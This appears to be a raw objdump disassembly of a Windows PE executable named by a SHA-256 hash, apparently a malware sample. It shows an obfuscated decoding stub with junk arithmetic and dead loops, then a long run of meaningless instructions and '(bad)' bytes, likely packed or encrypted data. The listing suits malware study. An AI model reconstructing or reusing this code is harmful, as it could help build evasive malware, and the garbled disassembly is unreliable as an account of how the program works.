
c87038cf07a7fb0663f7608598d51bab342bfe0f0ade7f51b042c9594dcb3f36.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42aa0b
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42aa0f
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42aa13
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42aa1b
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42aa1f
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42aa23
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42aa27
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax-0x3958fa21],esi
  4014ce:	cmp    al,0xc0
  4014d0:	pop    ds
  4014d1:	add    DWORD PTR [ebx+0x60478383],0xffffff83
  4014d8:	sub    DWORD PTR [edx],0x31
  4014db:	sub    BYTE PTR [esi],bh
  4014dd:	cmp    ah,BYTE PTR es:[eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	jo     0x401559
  4014e7:	jb     0x40155c
  4014e9:	jb     0x401536
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	pop    ebx
  40157c:	sub    bl,bh
  40157e:	bound  eax,QWORD PTR [eax]
  401580:	dec    ecx
  401581:	adc    eax,0x99234f7a
  401586:	bound  edi,QWORD PTR ds:0x3a090e35
  40158c:	or     BYTE PTR [ebx+0x17b68404],dh
  401592:	jle    0x401569
  401594:	cmp    bh,dh
  401596:	cs int 0x82
  401599:	cmp    BYTE PTR [edx-0x66d0c026],dh
  40159f:	cmp    ecx,DWORD PTR [ebx+0x47c67a5b]
  4015a5:	push   edx
  4015a6:	out    dx,al
  4015a7:	rol    DWORD PTR [ebx],0x19
  4015aa:	push   edx
  4015ab:	jmp    0x5ca394ba
  4015b0:	mov    ebp,0xea63c3e
  4015b5:	icebp  
  4015b6:	mov    ebx,0x149474a9
  4015bb:	imul   ebp,DWORD PTR [ebx],0x593b4179
  4015c1:	mov    es,WORD PTR [ebp+0x60]
  4015c4:	fs sub eax,0x6ea065bb
  4015ca:	push   esi
  4015cb:	sbb    edx,DWORD PTR [esi-0x62]
  4015ce:	adc    ch,BYTE PTR [ebp+0x1835fe37]
  4015d4:	or     dh,BYTE PTR [ecx+0x36]
  4015d7:	jge    0x4015f2
  4015d9:	icebp  
  4015da:	or     edi,DWORD PTR [edx]
  4015dc:	repz leave 
  4015de:	xor    eax,0x6b281094
  4015e3:	sub    al,0xcb
  4015e5:	adc    ah,BYTE PTR [eax]
  4015e7:	stos   BYTE PTR es:[edi],al
  4015e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e9:	(bad)  
  4015ea:	xor    esp,DWORD PTR [edi]
  4015ec:	xchg   BYTE PTR [ebp+ebx*4-0x17],al
  4015f0:	add    ecx,edi
  4015f2:	(bad)  
  4015f3:	arpl   WORD PTR [edi-0x50c48d9e],si
  4015f9:	add    eax,0xa0c3bf9b
  4015fe:	fs add al,0xb8
  401601:	add    ebp,DWORD PTR [esi-0x1c]
  401604:	call   0xe2a4:0x329b5208
  40160b:	mov    esp,0xa328865f
  401610:	and    BYTE PTR [eax-0x29ef710],cl
  401616:	cwde   
  401617:	ror    DWORD PTR [ebx+0x17],1
  40161a:	addr16 std 
  40161c:	pop    ebx
  40161d:	push   es
  40161e:	or     esi,ebp
  401620:	mov    ds:0x94630bf4,al
  401625:	mov    ds:0xbb62061,al
  40162a:	jo     0x401606
  40162c:	xchg   esp,eax
  40162d:	lods   al,BYTE PTR ds:[esi]
  40162e:	popf   
  40162f:	mov    ecx,gs
  401631:	jb     0x401621
  401633:	shl    DWORD PTR [ecx-0x267bdf7b],cl
  401639:	stc    
  40163a:	out    dx,al
  40163b:	push   0xffffffb9
  40163d:	hlt    
  40163e:	xchg   ecx,eax
  40163f:	add    edi,ebx
  401641:	(bad)  [esp+ebx*8-0x3e]
  401645:	mov    al,ds:0xe5567eb6
  40164a:	cmp    esp,ebx
  40164c:	js     0x4015fa
  40164e:	sbb    BYTE PTR [esi+esi*1+0x69],bh
  401652:	ret    
  401653:	imul   edx,ebp,0xffffffde
  401656:	es mov ecx,0x4e1c33a3
  40165c:	call   0x234c:0xc3d7d4d5
  401663:	xor    al,0xf3
  401665:	mov    ecx,0x485870f2
  40166a:	inc    ebp
  40166b:	ret    0x36cf
  40166e:	std    
  40166f:	nop
  401670:	mov    esp,0x890f9860
  401675:	mov    WORD PTR [esi],es
  401677:	add    BYTE PTR [esp+ecx*4+0x51],0x9d
  40167c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40167d:	adc    edi,DWORD PTR [edi]
  40167f:	in     eax,dx
  401680:	mov    eax,DWORD PTR fs:[ecx-0x4f]
  401684:	out    0xc8,al
  401686:	jecxz  0x401657
  401688:	mov    bl,0x3b
  40168a:	pop    ss
  40168b:	dec    edx
  40168c:	cmp    BYTE PTR [edi+edi*1],al
  40168f:	inc    ebx
  401690:	mov    eax,ds:0xfda5b2bc
  401695:	mov    esp,0xe9f79f65
  40169a:	mov    ebp,0x722e2972
  40169f:	pop    ebx
  4016a0:	mov    ebp,0xf3dd9d2a
  4016a5:	(bad)  
  4016a6:	fldcw  WORD PTR ds:0xb3b64c9e
  4016ac:	xor    esp,DWORD PTR [ebx+0x11]
  4016af:	and    ah,BYTE PTR [ebp+0x6b20fe55]
  4016b5:	push   edx
  4016b6:	xchg   ecx,eax
  4016b7:	mov    ah,BYTE PTR [ebx]
  4016b9:	bound  ebx,QWORD PTR [ebp-0x45292c64]
  4016bf:	loope  0x4016c1
  4016c1:	pmulhw mm5,QWORD PTR [ebx-0x7e]
  4016c5:	fiadd  DWORD PTR [ebx]
  4016c7:	call   0x144943dd
  4016cc:	inc    esi
  4016cd:	scas   al,BYTE PTR es:[edi]
  4016ce:	mov    BYTE PTR [eax-0x33837610],dl
  4016d4:	fwait
  4016d5:	ja     0x40170f
  4016d7:	jo     0x401667
  4016d9:	dec    edi
  4016da:	rcr    BYTE PTR [ebx+0x16629ca2],0xc3
  4016e1:	sahf   
  4016e2:	mov    eax,0x8a805693
  4016e7:	mov    BYTE PTR [esi],dl
  4016e9:	sub    BYTE PTR [eax+0x72],ch
  4016ec:	shl    DWORD PTR [edx-0x28],cl
  4016ef:	sbb    BYTE PTR [esi],cl
  4016f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016f2:	push   ebx
  4016f3:	push   cs
  4016f4:	sub    edx,ebx
  4016f6:	adc    eax,DWORD PTR [ecx+edi*2-0x27]
  4016fa:	add    eax,0xa1bc3e7e
  4016ff:	stos   DWORD PTR es:[edi],eax
  401700:	stos   BYTE PTR es:[edi],al
  401701:	ss push ss
  401703:	fcomi  st,st(7)
  401705:	mov    bh,0x9c
  401707:	call   0x6af5:0xcdb44850
  40170e:	add    esi,eax
  401710:	pop    esp
  401711:	dec    ecx
  401712:	(bad)  
  401714:	dec    DWORD PTR [edi+0x74]
  401717:	scas   al,BYTE PTR es:[edi]
  401718:	pushf  
  401719:	ret    
  40171a:	cld    
  40171b:	sub    DWORD PTR [edi-0x21],esp
  40171e:	call   0xeb5e:0x6ce8a548
  401725:	xchg   esp,eax
  401726:	mov    al,0xce
  401728:	cli    
  401729:	test   ebx,0x767b2e4b
  40172f:	pushw  ss
  401731:	ja     0x401712
  401733:	lahf   
  401734:	lods   al,BYTE PTR ds:[esi]
  401735:	scas   al,BYTE PTR es:[edi]
  401736:	push   ss
  401737:	add    BYTE PTR [edx-0x41],cl
  40173a:	out    dx,al
  40173b:	je     0x4016d1
  40173d:	lods   eax,DWORD PTR ds:[esi]
  40173e:	ret    0x76e6
  401741:	push   ebp
  401742:	pop    ds
  401743:	popa   
  401744:	and    DWORD PTR [esi],0xfdad3b3b
  40174a:	jmp    0x577:0x70589f50
  401751:	int3   
  401752:	cmp    dh,BYTE PTR [ecx+0x4]
  401755:	mov    edx,0xa56682c5
  40175a:	bound  ecx,QWORD PTR [eax-0x1a96d20f]
  401760:	mov    bh,0x8e
  401762:	adc    DWORD PTR [ebp-0x16],esp
  401765:	adc    bh,BYTE PTR [ebp+0x57]
  401768:	inc    ebp
  401769:	jl     0x4017a1
  40176b:	adc    BYTE PTR [edi],ah
  40176d:	out    dx,eax
  40176e:	cli    
  40176f:	or     al,BYTE PTR [esi+0x25]
  401772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401773:	mov    ds:0x416ecd57,al
  401778:	aaa    
  401779:	retf   0xf4e4
  40177c:	push   ebp
  40177d:	mov    ecx,0x3cc67864
  401782:	jb     0x401775
  401784:	mov    esi,0xb7af5b8
  401789:	aad    0x91
  40178b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40178d:	push   ebp
  40178e:	(bad)  
  40178f:	jecxz  0x40177d
  401791:	dec    eax
  401792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401793:	outs   dx,BYTE PTR ds:[esi]
  401794:	inc    ecx
  401795:	pop    edx
  401796:	in     eax,dx
  401797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401798:	mov    bl,0x5e
  40179a:	xchg   esp,eax
  40179b:	xor    edi,DWORD PTR ds:0x445b947a
  4017a1:	call   0xd85c4109
  4017a6:	fwait
  4017a7:	sahf   
  4017a8:	xor    ebx,esp
  4017aa:	push   edx
  4017ab:	pusha  
  4017ac:	ja     0x4017f5
  4017ae:	call   0x2375839a
  4017b3:	lds    edx,FWORD PTR ds:0x1ada8353
  4017b9:	add    ebp,DWORD PTR [edx+0x1b2e8f7d]
  4017bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c0:	enter  0x39c0,0xc2
  4017c4:	push   edx
  4017c5:	aad    0xe6
  4017c7:	mov    esi,0xf12e0154
  4017cc:	xor    edi,DWORD PTR [eax-0x70]
  4017cf:	add    al,0xc5
  4017d1:	and    bl,BYTE PTR [ecx+esi*8]
  4017d4:	aas    
  4017d5:	in     eax,dx
  4017d6:	pop    ds
  4017d7:	jge    0x401796
  4017d9:	mov    ch,ah
  4017db:	mov    edx,0x8a91d242
  4017e0:	pop    edx
  4017e1:	dec    esi
  4017e2:	adc    eax,0xc5f868f8
  4017e7:	xchg   BYTE PTR [edx-0x31],bh
  4017ea:	pop    ebx
  4017eb:	pop    edi
  4017ec:	cmc    
  4017ed:	cmp    al,0x24
  4017ef:	mov    ebx,0x9e5168ec
  4017f4:	dec    ecx
  4017f5:	jp     0x4017c1
  4017f7:	and    al,0xce
  4017f9:	paddusb mm1,QWORD PTR [eax-0x4ab52371]
  401800:	loope  0x401790
  401802:	retf   0x66d9
  401805:	push   esp
  401806:	jmp    0x4017fe
  401808:	pop    esi
  401809:	loopne 0x401873
  40180b:	cs es sahf 
  40180e:	push   ss
  40180f:	sub    esi,DWORD PTR [esi+0x7c]
  401812:	push   DWORD PTR [esi+0xd]
  401815:	dec    edx
  401816:	mov    DWORD PTR [edi+eax*8],ebx
  401819:	pop    ebx
  40181a:	push   ecx
  40181b:	(bad)  
  40181c:	cmp    al,0xfc
  40181e:	jns    0x401801
  401820:	cld    
  401821:	sbb    al,0x9d
  401823:	cs hlt 
  401825:	jo     0x40186c
  401827:	or     DWORD PTR [esp+ebp*2+0xa],ebx
  40182b:	or     al,0x9c
  40182d:	mov    ecx,0x6eb74e72
  401832:	les    ecx,FWORD PTR [edx]
  401834:	mov    BYTE PTR [esi-0x49bf0dec],ch
  40183a:	stos   BYTE PTR es:[edi],al
  40183b:	pop    edx
  40183c:	loopne 0x401825
  40183e:	fbstp  TBYTE PTR [esi-0x5b]
  401841:	hlt    
  401842:	ficomp DWORD PTR [esi+0x4f]
  401845:	jo     0x4017f6
  401847:	ficomp WORD PTR [edi]
  401849:	and    DWORD PTR [esi-0x70],edi
  40184c:	(bad)
  40184f:	fabs   
  401851:	int    0x40
  401853:	sbb    BYTE PTR ds:0x66f81196,bl
  401859:	cmp    dh,0xad
  40185c:	xchg   edi,eax
  40185d:	push   ecx
  40185e:	jmp    0xff9875a
  401863:	out    0x91,al
  401865:	inc    esp
  401866:	pop    esi
  401867:	jl     0x401805
  401869:	shl    DWORD PTR [edi],0xe8
  40186c:	pop    edx
  40186d:	stos   DWORD PTR es:[edi],eax
  40186e:	or     al,BYTE PTR [eax-0x20]
  401871:	(bad)  
  401872:	stos   DWORD PTR es:[edi],eax
  401873:	jae    0x4018cd
  401875:	ds mov ah,0xb4
  401878:	inc    ebp
  401879:	iret   
  40187a:	adc    BYTE PTR [ecx+esi*4],bh
  40187d:	inc    esp
  40187e:	mov    edi,0xb835b7be
  401883:	cli    
  401884:	inc    ebx
  401885:	cmp    eax,0xdbd369cf
  40188a:	scas   eax,DWORD PTR es:[edi]
  40188b:	push   edi
  40188c:	mov    ds:0xc81d8f65,al
  401891:	scas   al,BYTE PTR es:[edi]
  401892:	jmp    0x4d6ea64e
  401897:	mov    WORD PTR [eax-0x3daad009],?
  40189d:	in     al,0x83
  40189f:	sbb    ebx,DWORD PTR [ebx+0x59]
  4018a2:	or     BYTE PTR [eax-0x39fba175],dh
  4018a8:	mov    edx,0xcd7bf4d7
  4018ad:	pop    es
  4018ae:	sbb    DWORD PTR [edx-0x3c],0x6e
  4018b2:	push   es
  4018b3:	mov    cs,esi
  4018b5:	jno    0x40187f
  4018b7:	je     0x4018a9
  4018b9:	push   esp
  4018ba:	daa    
  4018bb:	outs   dx,BYTE PTR ds:[esi]
  4018bc:	nop
  4018bd:	rcr    eax,cl
  4018bf:	outs   dx,BYTE PTR ds:[esi]
  4018c0:	pop    ecx
  4018c1:	mov    edi,0xfbf9f645
  4018c6:	cwde   
  4018c7:	sbb    ebx,eax
  4018c9:	retf   
  4018ca:	pop    edi
  4018cb:	sahf   
  4018cc:	mov    al,0x67
  4018ce:	push   ebp
  4018cf:	push   ebp
  4018d0:	(bad)
  4018d3:	iret   
  4018d4:	jne    0x4018f4
  4018d6:	cmp    BYTE PTR [eax-0x5a959091],cl
  4018dc:	test   al,0x25
  4018de:	mov    edx,0x3af4ef83
  4018e4:	jle    0x40192d
  4018e6:	mov    ds,WORD PTR ds:0x3a63a6fa
  4018ec:	xchg   ecx,eax
  4018ed:	mov    ds:0xaa1fefda,eax
  4018f2:	xchg   esi,eax
  4018f3:	add    cl,bh
  4018f5:	mov    WORD PTR [eax],gs
  4018f7:	and    BYTE PTR [edi+ebx*1],0xe3
  4018fb:	addr16 retf 
  4018fd:	(bad)  
  4018fe:	jmp    0xb966:0xcc6dc9d0
  401905:	shl    DWORD PTR [edx+0x19],1
  401908:	fwait
  401909:	jae    0x40195f
  40190b:	sub    edi,edx
  40190d:	adc    al,0x6e
  40190f:	push   0x69ccc443
  401914:	inc    ecx
  401915:	or     eax,esp
  401917:	nop
  401918:	inc    edi
  401919:	aad    0x33
  40191b:	aas    
  40191c:	imul   esi,edi,0x47d80d6b
  401922:	or     DWORD PTR [eax-0x1948003b],edx
  401928:	cmp    BYTE PTR [ebx+0x18],ch
  40192b:	xlat   BYTE PTR ds:[ebx]
  40192c:	aaa    
  40192d:	(bad)  
  40192f:	jl     0x401993
  401931:	pushf  
  401932:	aaa    
  401933:	pop    edx
  401934:	daa    
  401935:	xlat   BYTE PTR ds:[ebx]
  401936:	mov    dl,0x23
  401938:	mov    eax,ds:0x8e0ebd1
  40193d:	call   0xd4347145
  401942:	pusha  
  401943:	adc    BYTE PTR [edx-0x77],0xe5
  401947:	cmp    DWORD PTR [ecx],0xffffffe3
  40194a:	mov    ah,0x99
  40194c:	retf   
  40194d:	(bad)  
  40194e:	out    dx,eax
  40194f:	cmp    esi,DWORD PTR [edx+0x3700954]
  401955:	dec    esi
  401956:	mov    WORD PTR [ebp-0x19],cs
  401959:	(bad)  
  40195a:	cli    
  40195b:	fcomp  DWORD PTR [esi]
  40195d:	sbb    eax,0x5f4647e
  401962:	inc    ecx
  401963:	pop    ss
  401964:	mov    ch,0xb7
  401966:	out    0xcf,al
  401968:	cmp    edx,eax
  40196a:	inc    ebx
  40196b:	lahf   
  40196c:	mov    ah,ch
  40196e:	les    eax,FWORD PTR [esi+0x49]
  401971:	jne    0x40197f
  401973:	push   0x45
  401975:	sbb    eax,0xfb701cfc
  40197a:	lods   al,BYTE PTR ds:[esi]
  40197b:	pop    eax
  40197c:	repz push 0x7915e54a
  401982:	dec    ebp
  401983:	adc    al,0xbf
  401985:	idiv   DWORD PTR [edi+ecx*4-0x74]
  401989:	xchg   esi,eax
  40198a:	adc    al,0x99
  40198c:	sub    BYTE PTR [eax],ch
  40198e:	inc    edx
  40198f:	mov    DWORD PTR [esi+0x7f],eax
  401992:	mov    ah,0xbd
  401994:	test   DWORD PTR [ebp+0x4906eb52],0x195949bd
  40199e:	repnz dec eax
  4019a0:	xchg   esp,eax
  4019a1:	add    ebp,DWORD PTR ds:0xfe2ce0b1
  4019a7:	cmp    ecx,edx
  4019a9:	or     al,0x5b
  4019ab:	iret   
  4019ac:	sar    DWORD PTR [ebx],0xf5
  4019af:	ret    
  4019b0:	lock adc eax,0x365e735f
  4019b6:	push   esp
  4019b7:	lods   al,BYTE PTR ds:[esi]
  4019b8:	cmp    eax,0x753626fc
  4019bd:	lahf   
  4019be:	(bad)  
  4019bf:	lods   eax,DWORD PTR ds:[esi]
  4019c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019c1:	ror    ch,1
  4019c3:	imul   eax,edi,0xffffff94
  4019c6:	fstp   TBYTE PTR ds:0x6711c985
  4019cc:	out    dx,eax
  4019cd:	pop    eax
  4019ce:	pusha  
  4019cf:	jo     0x4019c0
